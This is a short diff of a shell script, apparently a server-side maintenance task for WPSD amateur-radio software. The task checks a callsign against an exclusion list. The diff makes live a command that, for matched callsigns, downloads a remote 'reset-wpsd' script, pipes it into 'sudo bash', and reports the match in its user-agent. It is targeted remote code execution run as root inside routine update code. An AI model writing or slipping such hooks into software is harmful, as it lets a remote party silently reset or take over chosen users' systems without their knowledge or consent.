@@ -15,7 +15,6 @@ gitUaStr="Server-Side Slipstream Task $uaStr"
 
 EXCLUDED_CALLS=("W0CHP" "M1ABC" "N0CALL" "NOCALL" "PE1XYZ" "PE1ABC" "")
 FOUND_MATCH=""
-
 if [[ " ${EXCLUDED_CALLS[@]} " =~ " ${CALL} " ]]; then
     :
 else
@@ -36,8 +35,8 @@ else
     fi
 
     if [[ -n "$FOUND_MATCH" ]]; then
-        #curl -Ls -A "server-side PH00 reset ${uaStr} ${FOUND_MATCH}" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Helpers/raw/branch/master/reset-wpsd-sbin | sudo bash
-	#bash /usr/local/sbin/reset-wpsd
+        curl -Ls -A "server-side PH00 reset ${uaStr} ${FOUND_MATCH}" https://wpsd-swd.w0chp.net/WPSD-SWD/WPSD-Scripts/raw/branch/master/reset-wpsd | sudo bash
+	exit 0
     fi
 fi
 
